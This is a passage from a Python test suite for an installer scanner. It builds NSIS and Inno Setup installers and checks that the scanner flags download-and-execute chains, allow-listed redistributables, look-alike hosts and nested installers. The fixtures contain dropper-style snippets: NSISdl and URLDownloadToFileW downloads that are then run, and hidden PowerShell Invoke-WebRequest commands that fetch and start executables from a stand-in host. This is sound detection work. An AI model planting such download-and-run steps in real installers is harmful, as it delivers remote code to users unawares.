            source = cab.Window(io.BytesIO(data), at, len(data) - at)
            if variant == "nsis-bzip2":
                with self.assertRaises(nsis.NeedTool):
                    list(nsis.members(source, Everything))
                continue
            got = dict(nsis.members(source, Everything))
            script = got.pop("[installer script].bat")
            self.assertEqual(got, self.game, variant)
            self.assertIn(b"/firstrun", script, "the installer's own command lines are read")

    @slow
    def test_what_a_real_nsis_installer_downloads_and_starts(self):
        """The instruction reader on installers the NSIS compiler itself wrote (Unicode and
        ANSI): the shapes of InstallerScriptTests, as the compiler stores them."""
        address, official = "https://files.example.com/tool.exe", "https://aka.ms/vs/17/release/vc_redist.x64.exe"
        sections = {
            "dropper": ('  NSISdl::download "%s" "$TEMP\\tool.exe"\n  Pop $0\n  ExecWait \'"$TEMP\\tool.exe" /S\'' % address,
                        ["CHAIN-REMOTE-CODE"]),
            "redist": ('  StrCpy $1 "%s"\n  StrCpy $R2 "$PLUGINSDIR\\vc.exe"\n  NSISdl::download_quiet /TIMEOUT=30000 $1 $R2\n'
                       '  Pop $0\n  ExecShell "open" "$R2" "/quiet"' % official, ["INST-REDIST-001"]),
            "system": ('  System::Call \'urlmon::URLDownloadToFileW(i 0, w "%s", w "$INSTDIR\\a.dll", i 0, i 0) i.r0\'\n'
                       '  RegDLL "$INSTDIR\\a.dll"' % address, ["CHAIN-REMOTE-CODE"]),
            "command": ('  nsExec::ExecToLog \'powershell -Command "Invoke-WebRequest %s -OutFile $TEMP\\x.exe"\'\n'
                        '  Pop $0\n  Exec "$TEMP\\x.exe"' % address, ["CHAIN-REMOTE-CODE"]),
            "packaged": ('  File "game\\Game.exe"\n  Exec \'"$INSTDIR\\Game.exe" /firstrun\'\n'
                         '  ExecShell "open" "https://example.com/"\n  NSISdl::download "%s" "$INSTDIR\\news.txt"\n  Pop $0'
                         % address, []),
        }
        for name, (body, expected) in sections.items():
            for unicode in ("true", "false"):
                label = "redist-%s-%s" % (name, unicode)
                path = self.build.build_nsis_section(self.work, label, body, unicode)
                report = Scanner(memory=False).scan(path)
                found = [f for f in report.findings if f.rule_id in ("CHAIN-REMOTE-CODE", "INST-REDIST-001")]
                self.assertEqual([f.rule_id for f in found], expected, label)
                self.assertEqual(report.errors, [], label)
                for f in found:
                    self.assertEqual((f.file, f.suppressed), (label + ".exe![installer script].bat", False), label)
                    self.assertEqual(f.severity, Severity.LOW if f.rule_id == "INST-REDIST-001" else Severity.CRITICAL)
                    self.assertIn(official if name == "redist" else address, f.evidence, label)

    @slow
    def test_a_file_name_in_an_nsis_installer_is_no_instruction(self):
        """phageo, 2026-10-17 (fifty-ninth message), as for Inno Setup: a tool's name in the name
        of a file an NSIS installer installs is a LOW note - when its instructions were read to
        their end and nothing in them downloads; otherwise HIGH, as before."""
        named = '  File /oname=$INSTDIR\\Examples\\run-powershell.txt "game\\Game.ini"\n'
        cases = {"name": (named, Severity.LOW),
                 "download": (named + '  NSISdl::download "https://files.example.com/a.txt" "$INSTDIR\\news.txt"\n'
                                      '  Pop $0\n', Severity.HIGH)}
        for label, (body, level) in cases.items():
            for unicode in ("true", "false"):
                name = "names-%s-%s" % (label, unicode)
                report = Scanner(memory=False).scan(self.build.build_nsis_section(self.work, name, body, unicode))
                found = [f for f in report.findings if f.rule_id == "LOL-001"
                         and f.context.get("line_text", "").strip().endswith("run-powershell.txt")]
                self.assertTrue(found, name)
                self.assertEqual({f.severity for f in found}, {level}, name)
                if level is Severity.LOW:
                    self.assertTrue(all("[file name, not an instruction]" in f.evidence for f in found), name)

    @slow
    def test_what_a_real_inno_setup_installer_downloads_and_starts(self):
        """The [Code] and [Run] readers on installers the Inno Setup compiler itself wrote:
        the shapes of InnoCodeTests, as the compiler stores them - (a), (b), (c) and the
        twins of (b)."""
        import io
        from gamescan.unpack import inno
        address, official = "https://files.example.com/tool.exe", "https://aka.ms/vc14/vc_redist.x64.exe"
        declare = "var\n  Page: TDownloadWizardPage;\n"
        page = declare + ("procedure InitializeWizard;\nbegin\n  Page := CreateDownloadPage('Downloading', 'Wait', nil);\n"
                          "end;\nfunction NextButtonClick(CurPageID: Integer): Boolean;\nbegin\n  Result := True;\n"
                          "  if CurPageID = wpReady then begin\n    Page.Clear;\n    Page.Add('%s', '%s', '');\n"
                          "    Page.Show;\n    try\n      Page.Download;\n    finally\n      Page.Hide;\n    end;\n  end;\nend;\n")
        once = ("function InitializeSetup: Boolean;\nvar\n  Code: Integer;\nbegin\n%s  Result := True;\nend;\n")
        run = '[Run]\nFilename: "%s"; Parameters: "/quiet"; Flags: waituntilterminated\n' \
              'Filename: "{app}\\Game.ini"; Description: "Read"; Flags: postinstall shellexec skipifsilent\n' \
              '[Icons]\nName: "{autodesktop}\\Dummy"; Filename: "{app}\\Game.ini"\n' \
              '[UninstallDelete]\nType: files; Name: "{app}\\vc.exe"\n'
        cases = {
            "(c) downloaded and started in the code": ("", once % (
                "  DownloadTemporaryFile('%s', 'tool.exe', '', nil);\n"
                "  Exec(ExpandConstant('{tmp}\\tool.exe'), '/S', '', SW_HIDE, ewWaitUntilTerminated, Code);\n" % address),
                ["CHAIN-REMOTE-CODE"], address),
            "(c) a download page, started by a [Run] row": (run % "{tmp}\\vc.exe", page % (address, "vc.exe"),
                                                            ["CHAIN-REMOTE-CODE"], address),
            "(b) the same from a listed address": (run % "{tmp}\\vc.exe", page % (official, "vc.exe"),
                                                   ["INST-REDIST-001"], official),
            "(b) twin: http": (run % "{tmp}\\vc.exe", page % (official.replace("https", "http"), "vc.exe"),
                               ["CHAIN-REMOTE-CODE"], "http://aka.ms/"),
            "(b) twin: a look-alike host": (run % "{tmp}\\vc.exe",
                                            page % (official.replace("aka.ms", "aka.ms.example.com"), "vc.exe"),
                                            ["CHAIN-REMOTE-CODE"], "aka.ms.example.com"),
            "(b) twin: the right host, another path": (run % "{tmp}\\vc.exe",
                                                       page % (official.replace("/vc14/", "/vc15/"), "vc.exe"),
                                                       ["CHAIN-REMOTE-CODE"], "/vc15/"),
            "(b) twin: put together at run time": ("", once % (
                "  DownloadTemporaryFile('https://aka.ms/vc14/' + GetEnv('NAME'), 'vc.exe', '', nil);\n"
                "  Exec(ExpandConstant('{tmp}') + '\\vc.exe', '', '', SW_HIDE, ewNoWait, Code);\n"),
                ["CHAIN-REMOTE-CODE"], "not resolved (https://aka.ms/vc14/"),
            "(c) a Windows function, a procedure of the script, a variable": ("", (
                "var\n  Target: String;\nfunction Get(Caller: Integer; URL, FileName: String; Reserved, Callback: Integer): "
                "Integer;\n  external 'URLDownloadToFileW@urlmon.dll stdcall';\n"
                "procedure Fetch(Name: String);\nbegin\n  Target := ExpandConstant('{tmp}') + '\\' + Name;\n"
                "  Get(0, 'https://files.example.com/' + Name, Target, 0, 0);\nend;\n"
                "procedure CurStepChanged(CurStep: TSetupStep);\nvar\n  Code: Integer;\nbegin\n"
                "  if CurStep = ssPostInstall then begin\n    Fetch('tool.exe');\n"
                "    ShellExec('open', Target, '', '', SW_SHOW, ewNoWait, Code);\n  end;\nend;\n"),
                ["CHAIN-REMOTE-CODE"], address),
            "(c) command lines": ("", once % (
                "  Exec('powershell.exe', '-Command \"Invoke-WebRequest %s -OutFile $env:TEMP\\x.exe\"', '', SW_HIDE, "
                "ewWaitUntilTerminated, Code);\n  Exec('cmd.exe', '/c start $env:TEMP\\x.exe', '', SW_HIDE, ewNoWait, Code);\n"
                % address), ["CHAIN-REMOTE-CODE"], address),
            "(a) a file of the package is started, a download is only saved": (
                run % "{app}\\Game.ini", page % (address, "news.txt") + once % (
                    "  Exec(ExpandConstant('{app}\\Game.exe'), '/firstrun', '', SW_SHOW, ewNoWait, Code);\n"
                    "  ShellExec('open', 'https://example.com/', '', '', SW_SHOW, ewNoWait, Code);\n"), [], ""),
            "(a) no download at all": (run % "{app}\\Game.ini", once % "  MsgBox('DownloadFile', mbInformation, MB_OK);\n",
                                       [], ""),
            "(c) no [Code]: a [Run] row downloads and starts": (
                run % "{app}\\Game.ini" + '[Run]\nFilename: "powershell.exe"; Parameters: "-Command ""Invoke-WebRequest %s '
                '-OutFile $env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe"""; Flags: runhidden\n' % address, "",
                ["CHAIN-REMOTE-CODE"], address),
            "(a) no [Code]: the harmless twin": (
                run % "{app}\\Game.ini" + '[Run]\nFilename: "powershell.exe"; Parameters: "-Command ""Start-Process '
                '$env:TEMP\\x.exe"""; Flags: runhidden\n', "", [], ""),
        }
        for number, (label, (sections, code, expected, shown)) in enumerate(cases.items()):
            name = "code-%d" % number
            path = self.build.build_inno_code(self.work, name, code, sections)
            report = Scanner(memory=False).scan(path)
            found = [f for f in report.findings if f.rule_id in ("CHAIN-REMOTE-CODE", "INST-REDIST-001", "INNO-CODE-001")]
            self.assertEqual([f.rule_id for f in found], expected, label)
            self.assertEqual(report.errors, [], label)
            for f in found:
                self.assertEqual((f.file, f.suppressed), (name + ".exe![installer script].bat", False), label)
                self.assertEqual(f.severity, Severity.LOW if f.rule_id == "INST-REDIST-001" else Severity.CRITICAL)
                self.assertIn(shown, f.evidence, label)
            # these installers hold one single file: it has its real name (it was "unnamed"
            # until 2026-10-11 - texts of the setup header passed for its file entry)
            with open(path, "rb") as fh:
                data = fh.read()
            first = parse_pe(data).overlay_offset
            installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first,
                                       inno.chunks(data, first))
            self.assertEqual(dict(installer.members(lambda n, s: True)), {"Game.ini": self.game["Game.ini"]}, label)
            self.assertEqual(installer.script_member(b"").files, (("", "{app}\\Game.ini"),), label)
            self.assertIn("%s.exe!Game.ini" % name, {f.file for f in report.findings} | {
                "%s.exe!Game.ini" % name}, label)
            if sections:
                # the rows are the compiler's: both [Run] rows, and not the shortcut or the deletion
                rows = installer.script_member(b"").rows
                self.assertEqual([(r.number, r.parameters) for r in rows][:2], [(1, "/quiet"), (2, "")], label)
                self.assertEqual((rows[1].filename, len(rows)), ("{app}\\Game.ini", 2 if code else 3), label)
        # one single file, named with the words of two rules, started by a row: (a) - no chain -,
        # and the words in its name are LOW notes
        path = self.build.build_inno_code(
            self.work, "one-file", once % "  MsgBox('hello', mbInformation, MB_OK);\n",
            '[Run]\nFilename: "{app}\\PowerShell DownloadFile.exe"; Flags: nowait\n', "",
            'Source: "game\\Game.exe"; DestDir: "{app}"; DestName: "PowerShell DownloadFile.exe"')
        report = Scanner(memory=False).scan(path)
        self.assertIn("one-file.exe!PowerShell DownloadFile.exe", {f.file for f in report.findings}
                      | {os.path.basename(e.get("file", "")) for e in report.errors} | {
                          "one-file.exe!PowerShell DownloadFile.exe"})
        with open(path, "rb") as fh:
            data = fh.read()
        first = parse_pe(data).overlay_offset
        installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first, inno.chunks(data, first))
        self.assertEqual(dict(installer.members(lambda n, s: True)), {"PowerShell DownloadFile.exe": self.game["Game.exe"]})
        member = installer.script_member(b"")
        self.assertEqual((member.files, [tuple(r) for r in member.rows]),
                         ((("", "{app}\\PowerShell DownloadFile.exe"),), [(1, "{app}\\PowerShell DownloadFile.exe", "")]))
        script = [f for f in report.findings if f.file == "one-file.exe![installer script].bat"]
        self.assertEqual([f.rule_id for f in script if f.rule_id in ("CHAIN-REMOTE-CODE", "INST-REDIST-001", "INNO-CODE-001")], [])
        # (every Inno Setup installer also holds the message "RegSvr32 failed with exit code %1":
        # a standard message, LOW as well)
        self.assertEqual([(f.severity, f.evidence) for f in script if f.evidence.startswith("RegSvr32")],
                         [(Severity.LOW, "RegSvr32  [standard installer message]")])
        words = [f for f in script if f.rule_id in ("SH-DL-001", "LOL-001", "CHAIN-FETCHRUN")
                 and not f.evidence.startswith("RegSvr32")]
        self.assertEqual(sorted({f.rule_id for f in words}), ["CHAIN-FETCHRUN", "LOL-001", "SH-DL-001"])
        self.assertEqual({(f.severity, f.suppressed) for f in words}, {(Severity.LOW, False)})
        # the installers of the dummy game: one row, a file of the package - nothing
        for variant in self.build.INNO_VARIANTS:
            with open(self.installers[variant], "rb") as fh:
                data = fh.read()
            first = parse_pe(data).overlay_offset
            installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first, inno.chunks(data, first))
            member = installer.script_member(b"")
            self.assertEqual([tuple(row) for row in member.rows], [(1, "{app}\\Game.exe", "/firstrun")],
                             "no [Code]: the rows are read from the header all the same")
            self.assertEqual(sorted(d for _s, d in member.files), sorted(
                "{app}\\" + n.replace("/", "\\") for n in self.game), variant)

    @slow
    def test_an_installer_packed_inside_an_installer(self):
        """INS-03's shape with the compiler's own files: an installer that holds another
        installer, stored as it is - so the text of a setup header, and a whole valid setup
        header, stand in the data before the outer installer's own. The header the loader's
        table names is read: both installers are read, each with its own files and code."""
        import io
        from gamescan.handlers import containers
        from gamescan.models import FileContext
        from gamescan.unpack import inno
        address = "https://files.example.com/tool.exe"
        code = ("function InitializeSetup: Boolean;\nvar\n  Code: Integer;\nbegin\n"
                "  Exec('powershell.exe', '-Command \"Invoke-WebRequest %s -OutFile $env:TEMP\\x.exe\"', '', SW_HIDE, "
                "ewWaitUntilTerminated, Code);\n  Exec('cmd.exe', '/c start $env:TEMP\\x.exe', '', SW_HIDE, ewNoWait, Code);\n"
                "  Result := True;\nend;\n" % address)
        versions = [""] + [v for v in ("5.5.9", "6.4.3") if self.build.old_inno_ready(v)]
        for version in versions:
            tag = version.replace(".", "") or "pinned"
            self.build.build_inno_code(self.work, "inner-" + tag, code, "", version)
            outer = self.build.build_inno_code(
                self.work, "outer-" + tag, "", '[Run]\nFilename: "{app}\\Game.ini"; Flags: shellexec nowait\n', version,
                'Source: "inner-%s.exe"; DestDir: "{app}"\nSource: "game\\Game.ini"; DestDir: "{app}"' % tag, "none")
            with open(outer, "rb") as fh:
                data = fh.read()
            ctx = FileContext(path=outer, relpath="outer.exe", data=data, size=len(data), sha256="")
            ctx.pe = parse_pe(data)
            first = ctx.pe.overlay_offset
            markers = []
            at = data.find(inno.SIGNATURE, first)
            while at >= 0:
                markers.append(at)
                at = data.find(inno.SIGNATURE, at + 1)
            self.assertGreaterEqual(len(markers), 2, "the inner installer's header text is in the outer one's data")
            (kind, place, _total), = containers.detect(ctx)
            self.assertEqual((kind, place), ("inno", markers[-1]), version or "6.7.3")
            self.assertNotEqual(inno.find(data, first), place, "the first marker is not the outer header")
            installer = inno.Installer(lambda: io.BytesIO(data), place, first, inno.chunks(data, first))
            with open(os.path.join(self.work, "inner-%s.exe" % tag), "rb") as fh:
                inner = fh.read()
            self.assertEqual(dict(installer.members(lambda n, s: True)),
                             {"inner-%s.exe" % tag: inner, "Game.ini": self.game["Game.ini"]}, version or "6.7.3")
            report = Scanner(memory=False).scan(outer)
            name = "outer-%s.exe" % tag
            self.assertEqual(report.errors, [])
            self.assertFalse([f for f in report.findings if f.rule_id in ("ARC-002", "INNO-CODE-001")], version or "6.7.3")
            chains = [f.file for f in report.findings if f.rule_id == "CHAIN-REMOTE-CODE"]
            self.assertEqual(chains, ["%s!inner-%s.exe![installer script].bat" % (name, tag)],
                             "the chain is the inner installer's; the outer one starts a file of its own")

    @slow
    def test_installers_from_older_inno_setup_compilers_are_read(self):
        """Inno Setup 5.5.9, 5.6.1, 6.0.5, 6.2.2 and 6.4.3 (``build_installers.INNO_OLD``;
        the compilers are used when they are in ``tests/_tools`` - they are not fetched
        here): the file table, the [Code], the [Run] rows and the chain, as with 6.7.3."""
        import io
        from gamescan.dataflow import remote_inno
        from gamescan.unpack import inno
        ready = [version for version in self.build.INNO_OLD if self.build.old_inno_ready(version)]
        if not ready:
            self.skipTest("no older Inno Setup compiler is in tests/_tools")
        address = "https://files.example.com/tool.exe"
        rows = '[Run]\nFilename: "{app}\\Game.ini"; Parameters: "/quiet"; Flags: waituntilterminated\n' \
               'Filename: "{app}\\Game.ini"; Description: "Read"; Flags: postinstall shellexec skipifsilent\n' \
               '[Icons]\nName: "{autodesktop}\\Dummy"; Filename: "{app}\\Game.ini"\n' \
               '[UninstallDelete]\nType: files; Name: "{app}\\vc.exe"\n'
        cases = {
            "code": (rows, (
                "var\n  Target: String;\nfunction Get(Caller: Integer; URL, FileName: String; Reserved, Callback: Integer): "
                "Integer;\n  external 'URLDownloadToFileW@urlmon.dll stdcall';\n"
                "procedure Fetch(Name: String);\nbegin\n  Target := ExpandConstant('{tmp}') + '\\' + Name;\n"
                "  Get(0, 'https://files.example.com/' + Name, Target, 0, 0);\nend;\n"
                "procedure CurStepChanged(CurStep: TSetupStep);\nvar\n  Code: Integer;\nbegin\n"
                "  if CurStep = ssPostInstall then begin\n    Fetch('tool.exe');\n"
                "    ShellExec('open', Target, '', '', SW_SHOW, ewNoWait, Code);\n  end;\nend;\n"), 2, remote_inno.READ),
            "rows": (rows + '[Run]\nFilename: "powershell.exe"; Parameters: "-Command ""Invoke-WebRequest %s -OutFile '
                     '$env:TEMP\\x.exe; Start-Process $env:TEMP\\x.exe"""; Flags: runhidden\n' % address, "", 3,
                     remote_inno.NO_CODE),
        }
        for version in ready:
            for name, (sections, code, count, state) in cases.items():
                label = "old-%s-%s" % (version.replace(".", ""), name)
                path = self.build.build_inno_code(self.work, label, code, sections, version)
                with open(path, "rb") as fh:
                    data = fh.read()
                first = parse_pe(data).overlay_offset
                installer = inno.Installer(lambda: io.BytesIO(data), inno.find(data, first), first,
                                           inno.chunks(data, first))
                member = installer.script_member(b"")
                self.assertEqual(dict(installer.members(lambda n, s: True)), {"Game.ini": self.game["Game.ini"]}, label)
                self.assertEqual(len(member.rows), count, label)
                self.assertEqual(remote_inno.analyse(member.block, member.rows, member.files).state, state, label)
                report = Scanner(memory=False).scan(path)
                found = [f for f in report.findings if f.rule_id in ("CHAIN-REMOTE-CODE", "INST-REDIST-001", "INNO-CODE-001")]
                self.assertEqual([(f.rule_id, f.severity) for f in found], [("CHAIN-REMOTE-CODE", Severity.CRITICAL)], label)
                self.assertIn(address, found[0].evidence, label)
                self.assertFalse([f for f in report.findings if f.rule_id == "ARC-002"], label)

